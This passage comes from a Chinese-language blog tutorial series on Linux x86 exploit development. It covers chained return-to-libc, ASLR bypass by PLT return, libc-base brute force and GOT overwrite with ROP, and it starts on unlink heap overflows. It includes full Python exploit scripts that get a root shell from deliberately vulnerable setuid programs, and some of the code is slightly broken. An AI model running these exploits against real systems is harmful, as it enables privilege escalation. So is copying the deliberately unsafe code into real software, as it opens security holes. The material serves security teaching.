class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> fake_ebp0 = <span class="number">0xbffff1a0</span>  </span><br><span class="line"> fake_ebp1 = <span class="number">0xbffff1b8</span>  </span><br><span class="line"> fake_ebp2 = <span class="number">0xbffff1d0</span>  </span><br><span class="line"> fake_ebp3 = <span class="number">0xbffff1e8</span>  </span><br><span class="line"> fake_ebp4 = <span class="number">0xbffff204</span>  </span><br><span class="line">fake_ebp5 = <span class="number">0xbffff214</span>  </span><br><span class="line">fake_ebp6 = <span class="number">0xbffff224</span>  </span><br><span class="line">fake_ebp7 = <span class="number">0xbffff234</span>  </span><br><span class="line">leave_ret = <span class="number">0x0804851c</span>  </span><br><span class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span>  </span><br><span class="line">seteuid_addr = <span class="number">0xb7f09720</span>  </span><br><span class="line">system_addr = <span class="number">0xb7e61060</span>  </span><br><span class="line">exit_addr = <span class="number">0xb7e54be0</span>  </span><br><span class="line">sprintf_arg1 = <span class="number">0xbffff210</span>  </span><br><span class="line">sprintf_arg2 = <span class="number">0x80485f0</span>  </span><br><span class="line">sprintf_arg3 = <span class="number">0xbffff23c</span>  </span><br><span class="line">system_arg = <span class="number">0x804829d</span>  </span><br><span class="line">exit_arg = <span class="number">0xffffffff</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">      <span class="keyword">return</span> struc*.pack(<span class="string">"pack("</span>&lt;I<span class="string">",num)   </span></span><br><span class="line"><span class="string">buf = "</span>A<span class="string">"* 264   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp0)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">#Below four stack frames are for sprintf (to setup seteuid arg )  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">sprintf_arg1 += 1  </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp3)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">sprintf_arg1 += 1  </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp4)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">sprintf_arg1 += 1  </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)  </span></span><br><span class="line"><span class="string">#Dummy - To avoid null byte in fake_ebp4.   </span></span><br><span class="line"><span class="string">buf += "</span>X<span class="string">" * 4   </span></span><br><span class="line"><span class="string">#Below stack frame is for seteuid  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp5)   </span></span><br><span class="line"><span class="string">buf += conv(seteuid_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">#Dummy - This arg is zero'd by above four sprintf calls  </span></span><br><span class="line"><span class="string">buf += "</span>Y<span class="string">" * 4   </span></span><br><span class="line"><span class="string">#Below stack frame is for system  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp6)   </span></span><br><span class="line"><span class="string">buf += conv(system_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">buf += conv(system_arg)   </span></span><br><span class="line"><span class="string">#Below stack frame is for exit  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp7)   </span></span><br><span class="line"><span class="string">buf += conv(exit_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">buf += conv(exit_arg)   </span></span><br><span class="line"><span class="string">print "</span>Calling vulnerable program<span class="string">"  </span></span><br><span class="line"><span class="string">call(["</span>./test<span class="string">", buf])</span></span><br></pre></td></tr></table></figure><p>执行上述漏洞代码给我们<code>root shell</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu17.png" title="图17"><hr><h2 id="绕过ASLR-第一部分"><a href="#绕过ASLR-第一部分" class="headerlink" title="绕过ASLR - 第一部分"></a>绕过ASLR - 第一部分</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><blockquote><p>在前面的攻击教程中，我们看到了攻击者需要知道下面两样事情</p><p>1.堆栈地址（跳转到shellcode）</p><p>2.libc基地址（成功绕过NX bit）</p><p>为了利用漏洞代码。 为了阻止攻击者的行为，安全研究人员提出了一个称为“ASLR”的漏洞利用。</p></blockquote><p>地址空间布局随机化<code>ASLR</code>是随机化的利用缓解技术:堆栈地址，堆地址，共享库地址这三个一旦桑树地址被随机化，特别是当<code>共享库被随机化</code>时，我们采取的绕过<code>NX Bit</code>的方法不会生效，因为攻击者需要知道<code>libc的基地址</code>。但这种环节技术并不是万无一失的。</p><p>因为随机化被关闭，所以<code>libc基址是常量</code>（0xb7e22000 - 对于我们的“vuln”二进制文件）。<code>函数偏移也是不变</code>的（从<code>readelf -s libc.so.6 | grep</code>获得）现在当我们打开完全随机化（使用下面的命令）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p><code>libc</code>基地址将被随机化。但是<code>libc函数的偏移量</code>是不会变的。所以，如果我们可以<code>绕过共享库及地址随机化</code>，即使打开ASLR，也可以成功利用易受攻击的程序。</p><p>在这种技术中，而不是返回到<code>libc函数</code>。而是攻击者返回到一个<code>函数的PLT</code>。由于“function@PLT”不是随机的，所以攻击者不再需要预测libc的及地址，二十可以建档的返回到<code>function@PLT</code>来调用<code>function</code>。</p><p>与静态库不同，共享库代码段在多个进程之间共享，其数据段对于每一个进程是唯一的。这有助于减少内存空间和磁盘空间。由于代码段在多个进程之间共享，所以应该只有<code>read</code>和<code>execute</code>权限，英雌动态连接器不能重新定位代码段中存在的数据符号或函数地址。那么动态链接如何在运行时重新定位共享符号。</p><p>位置无关代码<code>PIC</code>是为了解决这个问题而开发的 - 它确保共享库代码段在多个进程之间共享，尽管在加载时执行重定位。<code>PIC</code>通过一级间接寻址实现这一点-共享库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变。</p><p>全局偏移表<code>GOT</code>：全局偏移表包含每个<code>全局变量</code>的<code>4字节条目</code>，其中4字节条目包含全局变量的地址。当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，<code>指令指向GOT中条目</code>。当加载共享库时，GOT条目由动态链接器重新定位。因此，<code>PIC</code>使用该表来重新定位具有单个间接级别的全局符号。</p><p>过程链接表<code>PLT</code>： 过程链接表包含每个全局函数的存根代码。代码段中的调用指令不直接调用函数<code>function</code>，而是调用存根代码<code>function @ PLT</code>。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到<code>GOT（GOT [n]）</code>。这次解析仅在函数<code>function</code>的第一次调用期间发生，稍后当代码段中的调用指令调用存根代码<code>function @PLT</code>时，而不是调用动态链接器来解析函数地址<code>function</code>存根代码直接从<code>GOT（GOT [n]）</code>获取功能地址并跳转到它。因此，<code>PIC</code>使用这个表来重新定位具有两级间接的功能地址。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span>  </span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);  </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>反编译<code>test</code>，我们可以找到<code>system@PLT</code>和 <code>exit@PLT</code>的地址。</p><p>使用这些地址我们可以写一个绕过<code>ASLR</code>和<code>NX bit</code>的漏洞利用代码。</p><p><strong>利用代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">system = <span class="number">0x8048380</span>  </span><br><span class="line">exit = <span class="number">0x80483a0</span>  </span><br><span class="line">system_arg = <span class="number">0x80485b5</span>     <span class="comment">#Obtained from hexdump output of executable 'test'  </span></span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment"># Junk + system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">272</span>  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(exit)  </span><br><span class="line">buf += conv(system_arg)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure><p>执行上面的<code>exploit</code>程序给我们<code>root shell</code>，如下所示：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu19.png" title="图19"><hr><h2 id="绕过ASLR-第二部分"><a href="#绕过ASLR-第二部分" class="headerlink" title="绕过ASLR - 第二部分"></a>绕过ASLR - 第二部分</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>使用爆破技巧，来绕过共享库地址随机化。在这个教程中，攻击者选择特定的 <code>Libc 基址</code>，并持续攻击程序直到成功。假设你足够幸运，这个技巧是用于<code>绕过 ASLR</code>的最简单的技巧。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);  </span><br><span class="line">    fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>下面是（当随机化打开时）不同的 <code>Libc 基址</code>：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu20.png" title="图20"><p>上面展示了，<code>Libc 随机化</code>仅限于 <code>8 位</code>。因此我们可以在最多 <code>256 次尝试内</code>，得到 <code>root shell</code>。在下面的利用代码中，让我们选择<code>0xb75b5000</code>作为<code>Libc</code>基址，并让我们尝试几次。</p><p>首先我们先找到<code>system()</code>的偏移量:<code>0x0003f0b0</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu21.png" title="图21"><p>其次找到<code>exit()</code>的偏移量：<code>0x0032bf0</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu22.png" title="图22"><p>然后找到<code>/bin/sh</code>的地址：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu23.png" title="图23"><p><strong>利用代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct </span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">libc_base_addr = <span class="number">0xb75b5000</span>  </span><br><span class="line">exit_off = <span class="number">0x0003f0b0</span>             <span class="comment">#Obtained from "readelf -s libc.so.6 | grep system" command.  </span></span><br><span class="line">system_off = <span class="number">0x00032bf0</span>           <span class="comment">#Obtained from "readelf -s libc.so.6 | grep exit" command.  </span></span><br><span class="line">system_addr = libc_base_addr + system_off  </span><br><span class="line">exit_addr = libc_base_addr + exit_off  </span><br><span class="line">system_arg = <span class="number">0xb76c06a0</span>    </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment">#system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span>  </span><br><span class="line">buf += conv(system_addr)  </span><br><span class="line">buf += conv(exit_addr)  </span><br><span class="line">buf += conv(system_arg)   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line"><span class="comment">#Multiple tries until we get lucky  </span></span><br><span class="line">i = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">256</span>):  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of tries: %d"</span> %i  </span><br><span class="line">i += <span class="number">1</span>  </span><br><span class="line">ret = call([<span class="string">"./test"</span>, buf])  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">not</span> ret):  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line">      <span class="keyword">print</span> <span class="string">"Exploit failed"</span></span><br></pre></td></tr></table></figure><p>运行上面的利用代码，我们会得到 <code>root shell</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu24.png" title="图24"><hr><h2 id="绕过ASLR-第三部分"><a href="#绕过ASLR-第三部分" class="headerlink" title="绕过ASLR - 第三部分"></a>绕过ASLR - 第三部分</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>让我们看看如何使用 GOT 覆盖和解引用技巧。来绕过共享库地址随机化。我们在第一部分中提到过，即使可执行文件没有所需的 PLT 桩代码，攻击者也可以使用 GOT 覆盖和解引用技巧来绕过 ASLR。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">    <span class="keyword">int</span> i;  </span><br><span class="line">    seteuid(getuid());  </span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Need an argument\n"</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">     &#125;  </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\nLen:%d\n"</span>, buf, (<span class="keyword">int</span>)<span class="built_in">strlen</span>(buf));  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>我们发现<code>system@PLT</code>并没有在我们的可执行文件<code>test</code>中出现。字符串<code>sh</code>也没有在我们的可执行文件<code>test</code>中出现。</p><p>将特定 <code>Libc 函数</code>的<code>GOT 条目</code>覆盖为另一个<code>Libc 函数</code>的地址（在第一次调用之后）。但是它也可以覆盖为<code>execve函数</code>的地址 – 当偏移差加到<code>GOT[getuid]</code>的时候。我们已经知道了，在共享库中，函数距离其基址的偏移永远是固定的。所以，如果我们将<code>两个 Libc 函数的差值</code>（<code>execve</code>和<code>getuid</code>）加到<code>getuid</code>的 GOT 条目，我们就得到了<code>execve函数</code>的地址。之后，<code>调用getuid</code>就会<code>调用execve</code>。</p><p><code>ROP</code> 是个技巧，其中攻击者一旦得到了调用栈的控制之后，他就可以执行精心构造的机器指令，来执行它所需的操作，即使没有直接的方式。例如，在 <code>return-to-libc</code> 攻击中，我们将返回地址覆盖为<code>system</code>的地址，来执行system。但是如果<code>system</code>（以及<code>execve函数族</code>）从 <code>Libc 共享库</code>中溢出了，攻击者就不能获得 <code>root shell</code>。这时，<code>ROP</code> 就可以拯救攻击者。在这个技巧中，即使任何所需的 Libc 函数都不存在，攻击者可以通过执行一系列的<code>零件</code>（<code>gadget</code>），来模拟所需的 <code>Libc 函数</code>。</p><p><strong>Step 1</strong>：我们需要一个零件，它将偏移差加到<code>GOT[getuid]</code>上。所以让我们寻找一个<code>add零件</code>，它将结果复制到内存区域中。</p><p><strong>Step 2</strong>：确保 <code>EBX</code> 包含<code>getuid的 GOT 条目</code>。<code>getuid的 GOT 条目</code>（在下面展示）位于<code>0x804a004</code>。因此 <code>EBX</code>应该为<code>0x804a004</code>，但是由于<code>add零件</code>中，固定值<code>0x5d5b04c4</code>加到了 <code>EBX</code>，所以 <code>EBX</code> 应减去这个固定值，也就是<code>ebx = 0x804a004 -0x5d5b04c4 = 0xaaa99b40</code>。</p><p><strong>Step 3</strong>：现在我们需要寻找一个零件，它将这个<code>值0xaaa99b40</code>复制到 <code>EBX 寄存器</code>中。确保 <code>EAX</code> 包含偏移差。因此我们需要找到一个零件，它将偏移差复制到 <code>EAX 寄存器</code>中。</p><hr><h2 id="使用unlink堆溢出"><a href="#使用unlink堆溢出" class="headerlink" title="使用unlink堆溢出"></a>使用unlink堆溢出</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>使用 <code>unlink 技巧</code>成功利用<code>堆溢出</code>。</p><p><strong>漏洞程序：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*  </span></span><br><span class="line"><span class="comment">  Heap overflow vulnerable program.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;      </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span>  </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">         <span class="keyword">char</span> *first, *second;    </span><br><span class="line"> <span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );  </span><br><span class="line"> <span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );  </span><br><span class="line">         <span class="keyword">if</span>(argc!=<span class="number">1</span>)  </span><br><span class="line"> <span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );  </span><br><span class="line"> <span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );  </span><br><span class="line"> <span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );  </span><br><span class="line"> <span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面程序的行[3]会导致堆溢出。用户输入<code>argv[1]</code>复制给了堆<code>缓冲区first</code>，没有任何大小限制。因此，当用户输入大于 666 字节时，它就会覆盖下一个块的头部。这个溢出会导致任意代码执行。</p><p><strong>unlink</strong>：这个技巧的核心思想，就是欺骗 <code>glibc malloc</code> 来 <code>unlink 第二个块</code>。<code>unlink free</code>的 <code>GOT 条目</code>会使其被 <code>shellcode</code> 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，<code>shellcode</code>就会执行。</p><blockquote><p>首先我们了解一下<code>glibc malloc</code></p><p> <code>ptmalloc2</code>是从 <code>dlmalloc</code>分叉的。在<code>fork</code>之后，线程支持被添加到它并在2006年发布。在正式发布之后，<code>ptmalloc2</code>被集成到<code>glibc</code>源代码中。一旦集成，代码更改就直接转换为<code>glibc malloc</code>源代码本身。因此，<code>ptmalloc2</code>和<code>glibc</code>的<code>malloc</code>实现之间可能会有很多变化。曾经出现在这个岗位的<code>malloc</code>内部调用要么<code>BRK</code>或<code>MMAP系统调用</code>。由于<code>tmalloc2</code>的线程支持，它成为了<code>nux的默认内存分配器</code>。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在<code>dlmalloc</code>中，当两个线程同时调用<code>malloc</code>时，只有一个线程可以进入<code>临界区</code>，因为<code>freelist数据结构</code>在所有可用线程之间共享。因此，内存分配在多线程应用程序中需要时间，从而导致性能下降。在<code>ptmalloc2</code>中，当两个线程<code>同时调用malloc</code>时，会立即分配内存，因为每个线程都维护一个单独的堆段，因此维护这些堆的空列表数据结构也是分开的。每个线程竞技场。</p></blockquote><p><strong>多个竞技场时：</strong></p><p>​      • 当主线程，第一次调用<code>malloc</code>已经创建主竞技场时，没有任何争用。</p><p>​      • 当线程1和线程2<code>第一次调用malloc</code>时，会为它们创建一个新的竞技场，并且它的使用没有任何争用。直到这一点，线程和竞技场都有一对一的映射。</p><p>​      • 当线程3<code>第一次调用malloc</code>时，<code>计算竞技场限制的数量</code>。这里竞技场限制被越过，因此尝试重用现有竞技场（主竞技场或竞技场1或竞技场2）</p><p>​      • 重用：</p><p>​           • 一旦环绕可用的竞技场，循环尝试锁定该竞技场。</p><p>​           • 如果成功锁定（让主竞技场成功锁定），请将该竞技场返回给用户。</p><p>​           • 如果没有发现任何竞技场，则  排在下一个竞技场。</p><p>​      • 